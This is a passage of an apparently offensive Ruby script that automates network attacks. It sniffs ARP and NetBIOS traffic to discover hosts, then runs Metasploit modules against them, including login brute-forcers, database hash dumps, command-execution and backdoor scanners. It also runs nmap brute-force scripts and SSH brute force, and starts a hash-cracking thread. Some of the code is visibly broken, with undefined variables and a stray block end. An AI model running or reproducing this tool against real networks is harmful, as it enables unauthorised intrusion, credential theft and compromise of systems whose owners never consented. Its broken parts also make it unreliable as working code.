			#nmap --script=rmi-vuln-classloader -p 1099 -iL host1099.txt
			exploitList << "use exploit/multi/misc/java_rmi_server"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="23"
			exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_password"
			exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_version"
			exploitList << "use auxiliary/scanner/telnet/telnet_encrypt_overflow"
			exploitList << "use auxiliary/scanner/telnet/telnet_login"
			exploitList << "use auxiliary/scanner/telnet/telnet_ruggedcom"
			exploitList << "use auxiliary/scanner/telnet/telnet_version"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="79"
			exploitList << "use auxiliary/scanner/finger/finger_users"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="111"
			exploitList << "use auxiliary/scanner/misc/sunrpc_portmapper"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end		


			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="902"
			puts "nmap -p 902 --script vmauthd-brute -iL hosts_port902.txt"
			exploitList << "use auxiliary/scanner/vmware/vmauthd_login"
			exploitList << "use auxiliary/scanner/vmware/vmauthd_version"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="1128"
			exploitList << "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="1158"
			exploitList << "use auxiliary/scanner/oracle/emc_sid"
			exploitList << "use auxiliary/scanner/oracle/spy_sid"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="1900"
			puts "nmap -sU -p 1900 --script=upnp-info -iL hosts_port1900.txt"
			exploitList << "use auxiliary/scanner/upnp/ssdp_msearch"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end	
		if port=="1720"
			exploitList << "use auxiliary/scanner/h323/h323_version"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="2010"	
			puts "nmap -sT  -p 2010 --script=+jdwp-exec --script-args cmd=date -iL hosts_port2010.txt"
		end
		if port=="3299"
			exploitList << "use auxiliary/scanner/sap/sap_router_info_request"
			exploitList << "use auxiliary/scanner/sap/sap_router_portscanner"
			exploitList << "use auxiliary/scanner/sap/sap_service_discovery"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="3306"
			exploitList << "use auxiliary/scanner/mysql/mysql_authbypass_hashdump"
			exploitList << "use auxiliary/scanner/mysql/mysql_file_enum"
			exploitList << "use auxiliary/scanner/mysql/mysql_hashdump"
			exploitList << "use auxiliary/scanner/mysql/mysql_login"
			exploitList << "use auxiliary/scanner/mysql/mysql_schemadump"
			exploitList << "use auxiliary/scanner/mysql/mysql_version"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end

		end
		if port=="3500"	
			exploitList << "use auxiliary/scanner/emc/alphastor_librarymanager"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="5000"	
			exploitList << "use auxiliary/admin/hp/hp_data_protector_cmd"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="5038"	
			exploitList << "use auxiliary/voip/asterisk_login"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="5060"	
			exploitList << "use auxiliary/scanner/sip/enumerator"
			exploitList << "use auxiliary/scanner/sip/enumerator_tcp"
			exploitList << "use auxiliary/scanner/sip/options"
			exploitList << "use auxiliary/scanner/sip/options_tcp"
			exploitList << "use auxiliary/scanner/sip/sipdroid_ext_enum"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="5432"	
			puts "nmap -p 5432 --script pgsql-brute -iL hosts_port5432.txt"
			exploitList << "use auxiliary/scanner/postgres/postgres_dbname_flag_injection"
			exploitList << "use auxiliary/scanner/postgres/postgres_hashdump"
			exploitList << "use auxiliary/scanner/postgres/postgres_login"
			exploitList << "use auxiliary/scanner/postgres/postgres_schemadump"
			exploitList << "use auxiliary/scanner/postgres/postgres_version"

			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end

		end
		if port=="5560"
			exploitList << "use auxiliary/scanner/oracle/isqlplus_sidbrute"
			exploitList << "use auxiliary/scanner/oracle/isqlplus_login"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="5631"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_login"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_tcp"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_udp"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end

		if port=="5900"	
			puts "nmap --script vnc-brute -p 5900 -iL hosts_port5900.txt"
		end
		if port=="5985"	
			exploitList << "use auxiliary/scanner/winrm/winrm_auth_methods"
			exploitList << "use auxiliary/scanner/winrm/winrm_cmd"
			exploitList << "use auxiliary/scanner/winrm/winrm_login"
			exploitList << "use auxiliary/scanner/winrm/winrm_wql"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="6000"
			exploitList << "use auxiliary/scanner/x11/open_x11"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="6106"
			exploitList << "use auxiliary/admin/backupexec/registry"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="6379"
			exploitList << "use auxiliary/scanner/misc/redis_server"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="8000"
			exploitList << "use auxiliary/admin/http/hp_web_jetadmin_exec"
			exploitList << "use auxiliary/scanner/http/barracuda_directory_traversal"
			exploitList << "use auxiliary/scanner/http/splunk_web_login"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
			
		end
		if port=="8222"	
			puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
		end
		if port=="8333"	
			puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
		end
		if port=="8161"
			exploitList << "use auxiliary/scanner/http/apache_activemq_source_disclosure"
			exploitList << "use auxiliary/scanner/http/apache_activemq_traversal"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="8222"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="8834"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="9000"
			exploitList << "use auxiliary/admin/http/axigen_file_access"
			exploitList << "use auxiliary/scanner/misc/raysharp_dvr_passwords"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="9084"
			exploitList << "use auxiliary/scanner/http/vmware_update_manager_traversal"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end	
		if port=="9100"	
			exploitList << "use auxiliary/scanner/printer/printer_download_file"
			exploitList << "use auxiliary/scanner/printer/printer_env_vars"
			exploitList << "use auxiliary/scanner/printer/printer_list_dir"
			exploitList << "use auxiliary/scanner/printer/printer_list_volumes"
			exploitList << "use auxiliary/scanner/printer/printer_ready_message"
			exploitList << "use auxiliary/scanner/printer/printer_version_info"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="9200"	
			exploitList << "use auxiliary/scanner/elasticsearch/indeces_enum"
			exploitList << "use auxiliary/scanner/elasticsearch/indices_enum"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="10001"	
			exploitList << "use auxiliary/admin/zend/java_bridge"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="11211"	
			puts "nmap -p 11211 --script membase-brute -iL hosts_port11211.txt"
		end
		if port=="13364"	
			exploitList << "use auxiliary/scanner/misc/rosewill_rxs3211_passwords"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end	
		end
		if port=="17185"	
			exploitList << "use auxiliary/scanner/vxworks/wdbrpc_bootline"
			exploitList << "use auxiliary/scanner/vxworks/wdbrpc_version"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end
		if port=="27017"	
			exploitList << "use auxiliary/scanner/mongodb/mongodb_login"
		end
		if port=="32764"	
			exploitList << "use auxiliary/scanner/misc/sercomm_backdoor_scanner"
			for exp in exploitList
				self.run_single(exp)
				hosts.each do |net|
					self.run_single("set RHOSTS #{net}")	
					self.run_single("set RHOST #{net}")
	       				self.run_single("exploit")
				end
			end
		end



=end
end

def runScan()
	loop{
		if $scanList.length>0
			#$scanList.peach{|x| 
			#$scanList.pmap{|x| 
			$scanList.each{|x| 
				$scanList.delete(x)
				if not $blackList.include? x
					portList=runNmap(x)
					if portList.length>0
						#Tasks to run after detecting host in network
						puts "run prepareMsf"
						runMsf(x,portList)
						#here
						#prepareMsfResource(x,portList)
					for y in portList
						#if y==5432
						#	puts '\nrunPostgreSQL'
						#end
						#if y==1433
						#	puts '\nrunMSSQL'
						#end
						#if y==445
						#	puts "\nrunSMB"
						#	runSMB(x)
						#end
						if y==22
							puts '\nrunMedusa'
							sshBrute()
						end
						#if y==21
						#	puts '\nrunFTP'
						#end
						#if y==23
						#	puts '\nrunTelnet'
						#end
					#end					e
					end
				end
			}
		end
		sleep(5)
	}
end

def ip2Netbios(ipAddr)
	cmd = "nmblookup -A "+ipAddr
	puts cmd
	output = timeout_cmd(cmd,2)
	puts output
	result=''
	found=0
	while found!=1
		for i in output	
			if output.include? "No reply from "
				puts "No results for: "+ipAddr
				found=1
			end
			if i.include? "<00>" and !i.include? "<GROUP>"
				result=i
				found=1
			end
		end
	end
	hostname = result.split(" ")[0]
	print "[!] Netbios Name: "+hostname+" - "+ipAddr+"\n"
	insertHost(hostname,ipAddr)
end

def updateHostNBNS(nbnsName,ipAddr)
	begin
		db1 = SQLite3::Database.open "database.db"
		stmt1 = db1.prepare "update hosts set nbnsName=? where ipAddr=?"
		stmt1.bind_param 1, nbnsName
		stmt1.bind_param 2, ipAddr
		rs1 = stmt1.execute
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end
end

def findMac(macAddr)
	rows = ''
	begin
  		macAddr = macAddr.strip()

    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT macAddr from hosts WHERE macAddr=?"
		stmt.bind_param 1, macAddr
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end
	if not rows.nil?
		if rows.length>0
			return true
		else
			return false
		end
	else
		return false
	end
end
def updateHost(macAddr,ipAddr)
	rows = ''
	begin
  		macAddr = macAddr.strip()
		ipAddr = ipAddr.strip()

    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT ipAddr from hosts WHERE macAddr=?"
		stmt.bind_param 1, macAddr
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end
	begin
	   	db1 = SQLite3::Database.open "database.db"
		if rows.nil?
			print Color.green,Color.bold,"[*] New Device Found - "+ipAddr+" (Mac: "+macAddr+")",Color.clear,"\n"
			stmt1 = db1.prepare "insert into hosts (macAddr,ipAddr,runScan) VALUES (?,?,0)"
			stmt1.bind_param 1, macAddr
			stmt1.bind_param 2, ipAddr
			rs1 = stmt1.execute
		else
			if rows[0]!=ipAddr
				puts "old: "+rows[0]+" new: "+ipAddr
				puts "[*] Change in IP address (IP: "+ipAddr+") (Mac: "+macAddr+")"
				stmt1 = db1.prepare "update hosts set ipAddr=? where macAddr=?"
				stmt1.bind_param 1, ipAddr
				stmt1.bind_param 2, macAddr
				rs1 = stmt1.execute
			end
		end
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end
end

def local_ip
  cmd =  'echo `ifconfig eth0 | grep \'inet addr:\'|grep -o -P \'(?<=addr:).*(?=Bcast)\'`'
  output = run_cmd(cmd)
  return output[0]
=begin
  orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true  # turn off reverse DNS resolution temporarily

  UDPSocket.open do |s|
    s.connect '64.233.187.99', 1
    s.addr.last
  end
ensure
  Socket.do_not_reverse_lookup = orig
=end
end

def nmblookup(ipAddr)
  command = "arp"
  macAddr = ''
  p = IO.popen(command) do |f|
  	f.each_line do |g| 
		if g.include? ipAddr 
			macAddr = (g.split(" ").map(&:strip))[2]
		end
       	end
  end

  #Get Mac Address of IP Address
  udp_pkt = PacketFu::UDPPacket.new
  udp_pkt.eth_dst = "\xff\xff\xff\xff\xff\xff"

  #Randomize Source Port
  udp_pkt.udp_src=137
  udp_pkt.udp_dst=137

  udp_pkt.ip_saddr=local_ip
  udp_pkt.ip_daddr=macAddr
  nbns_tranID = "\x80\x0a"
  nbns_flags  = "\x00\x00"
  nbns_questions = "\x00\x01"
  nbns_answers = "\x00\x00"
  nbns_authority = "\x00\x00"
  nbns_additional = "\x00\x00"
  nbns_queriesNbstat = '\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00'
  nbns_queriesType="\x00\x21"
  nbns_queriesClass="\x00\x01"

  udp_pkt.payload=nbns_tranID+nbns_flags+nbns_questions+nbns_answers+nbns_authority+nbns_additional<<encodedHex<<nbns_quriesNbstat<<nbns_queriesType<<nbns_queriesClass
  udp_pkt.recalc
  #udp_pkt.to_f('/mnt/hgfs/tmp/udp.pcap')
  puts "[*] Sent NBSTAT Query: "+hostName
  udp_pkt.to_w("eth0")
end

def getNetBIOS(ipAddr)
	Socket.do_not_reverse_lookup = false  
	puts Socket.getaddrinfo(ipAddr, nil)[0][2]      
end

def sendNetBIOS(hostName)
  charLookup = { "A"=>"EB", "B"=>"EC", "C"=>"ED", "D"=>"EE", "E"=>"EF", "F"=>"EG", "G"=>"EH", "H" =>"EI", "I" =>"EJ", "J" =>"EK", "K" =>"EL", "L" =>"EM", "M" =>"EN", "N" =>"EO", "O" =>"EP", "P" =>"FA", "Q" =>"FB", "R" =>"FC", "S" =>"FD", "T" =>"FE", "U" =>"FF", "V" =>"FG", "W" =>"FH", "X" =>"FI", "Y" =>"FJ", "Z" =>"FK", "0" =>"DA", "1" =>"DB", "2" =>"DC", "3" =>"DD", "4" =>"DE", "5" =>"DF", "6" =>"DG", "7" =>"DH", "8" =>"DI", "9" =>"DJ", " " =>"CA", "!" =>"CB", "$" =>"CE", "%" =>"CF", "&" =>"CG", "'" =>"CH", "(" =>"CI", ")" =>"CJ", "*" =>"CK", "+" =>"CL", "," =>"CM", "-" =>"CN", "." =>"CO", "=" =>"DN", ":" =>"DK", ";" =>"DL", "@" =>"EA", "^" =>"FO", "_" =>"FP", "{" =>"HL", "}" =>"HN", "~" =>"HO"}
  ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
  broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
  puts "[*] Interface IP: "+local_ip
  #puts broadcastIP
  udp_pkt = PacketFu::UDPPacket.new
  udp_pkt.eth_dst = "\xff\xff\xff\xff\xff\xff"
  udp_pkt.udp_src=137
  udp_pkt.udp_dst=137

  udp_pkt.ip_saddr=local_ip
  udp_pkt.ip_daddr=broadcastIP
  nbns_tranID = "\x80\x0a"
  nbns_flags  = "\x01\x10"
  nbns_questions = "\x00\x01"
  nbns_answers = "\x00\x00"
  nbns_authority = "\x00\x00"
  nbns_additional = "\x00\x00"
  nbns_queriesType="\x00\x20"
  nbns_queriesClass="\x00\x01"

  encoded = ''
  encodedHex = "\x20"
  hostName.scan(/./).each do |i|
   encoded<<charLookup[i.upcase()]
   c=charLookup[i.upcase()]
   encodedHex<<c
  end
  encodedHex<<"\x43\x41\x43\x41\x41\x41\x00"
  udp_pkt.payload=nbns_tranID+nbns_flags+nbns_questions+nbns_answers+nbns_authority+nbns_additional<<encodedHex<<nbns_queriesType<<nbns_queriesClass
  udp_pkt.recalc
  udp_pkt.to_f('/mnt/hgfs/tmp/udp.pcap')
  puts "[*] Sent Netbios Name Query for: "+hostName
  udp_pkt.to_w("eth0")
end

def sniff(iface)
  puts "[*] Listening to: "+iface
  #puts "[*] Looking for Packets Matching Destination IP: "+dstIP
  charLookup = {"EB"=>"A", "EC"=>"B", "ED"=>"C", "EE"=>"D", "EF"=>"E", "EG"=>"F", "EH"=>"G", "EI"=>"H", "EJ"=>"I", "EK"=>"J", "EL"=>"K", "EM"=>"L", "EN"=>"M", "EO"=>"N", "EP"=>"O", "FA"=>"P", "FB"=>"Q", "FC"=>"R", "FD"=>"S", "FE"=>"T", "FF"=>"U", "FG"=>"V", "FH"=>"W", "FI"=>"X", "FJ"=>"Y", "FK"=>"Z","DA"=>"0", "DB"=>"1", "DC"=>"2", "DD"=>"3", "DE"=>"4", "DF"=>"5", "DG"=>"6", "DH"=>"7", "DI"=>"8", "DJ"=>"9", "CA"=>" ", "CB"=>"!",  "CE"=>"$", "CF"=>"%", "CG"=>"&", "CH"=>"'", "CI"=>"(", "CJ"=>")", "CK"=>"*", "CL"=>"+", "CM"=>",", "CN"=>"-", "CO"=>".", "DN"=>"=", "DK"=>":", "DL"=>";", "EA"=>"@", "FO"=>"^", "FP"=>"_", "HL"=>"{", "HN"=>"}", "HO"=>"~"}

  #Get Broadcast IP Address
  ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
  broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'

  cap = Capture.new(:iface => iface, :start => true)
  cap.stream.each do |p|
    pkt = Packet.parse p
    if pkt.eth_daddr==Mac.addr and pkt.proto.last=='ARP' 
	if pkt.arp_opcode==2
		if !$hostList.include? pkt.arp_saddr_ip
			puts "[!] Found Host: "+pkt.arp_saddr_ip+" (" +pkt.arp_saddr_mac+")"
			
			if findMac(pkt.eth_saddr)==false			
				#here
				#Send arp packet to get mac address
				#getMacAddress(pkt.arp_saddr_ip.to_s)
				$hostList<<(pkt.arp_saddr_ip)
				$scanList<<(pkt.arp_saddr_ip)
			else
				$hostList<<(pkt.arp_saddr_ip)
			end
		end
	end
    end
    #Listens and picks up ARP packets
    if pkt.is_arp?
      if pkt.eth_daddr==Mac.addr
      	 if pkt.arp_opcode==2
		
	    ipAddr = pkt.arp_saddr_ip
	    macAddr = pkt.arp_saddr_mac
	    #puts "destination: "+pkt.arp_daddr_ip+" ("+pkt.arp_daddr_mac+")"
	    updateHost(macAddr,ipAddr)

         end
      end
    end
    #Listens to NetBIOS broadcast packets for new hosts
    #if pkt.is_ip?
    if pkt.is_udp?
      next if pkt.ip_saddr == Utils.ifconfig(iface)[:ip_saddr]
      packet_info = [pkt.ip_saddr, pkt.ip_daddr, pkt.size, pkt.proto.last]
      finalStr = ''
      if (pkt.ip_daddr==broadcastIP) and  pkt.proto.last=='UDP' and pkt.udp_sport==137
	     tranID = pkt.hexify(pkt.payload[0..1])
             nbnsq_flags = pkt.hexify(pkt.payload[2..3])
	     nbnsq_flags = nbnsq_flags.gsub(" ","")
	     nbnsq_flags = nbnsq_flags.gsub(".","")
	     nbnsq_flags = nbnsq_flags.gsub("(","")
	     nbnsq_flags = nbnsq_flags.gsub(")","")
	     #puts "Packet found"
             tranID1 = tranID.split(" ")
	     pkt.payload().split("").each do |i|
              	charDict = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              	if charDict.include? i
              		finalStr += i
              	end
	     end
             nbnsq_list = chunk(finalStr,2)
	     if tranID1[0]=="80" and tranID1[1]=="00"
	        if nbnsq_flags.to_s=="2910"
	    	        decoded = ''
		        process=0
               	 	while process!=1
				for i in nbnsq_list
					if !charLookup[i].nil?
						decoded<<charLookup[i]
					else
						process=1
					end			
				end
			end
			puts "[!] Received NetBIOS Broadcast - (Name: "+decoded+") (IP: "+pkt.ip_saddr+")"
			ipAddr = "%-15s" %packet_info
			hostName = decoded
			updateHostNBNS(hostName,pkt.ip_saddr)
                end

	    end   
	 end
      end

   end
end
#setup()

#class MyApp < Thor
#  desc: "Say Hello"
#  method_option :name, :aliases => "-n", :desc => "Specify a name"
#  def hello
#    puts "Hello #{options[:name]}"
#  end
#end


system('rm -rf database.db')
sleep(1)
createDatabase()
msfHandler()
#watchResponderDir()
#watchPwdDir()
#system('rm -rf scan_1*')

threadList=[]
threadList<<Thread.new{crackHash()}
threadList<<Thread.new{sniff(iface)}
threadList<<Thread.new{findHosts()}
threadList<<Thread.new{runScan()}
threadList.each {|x| x.join}

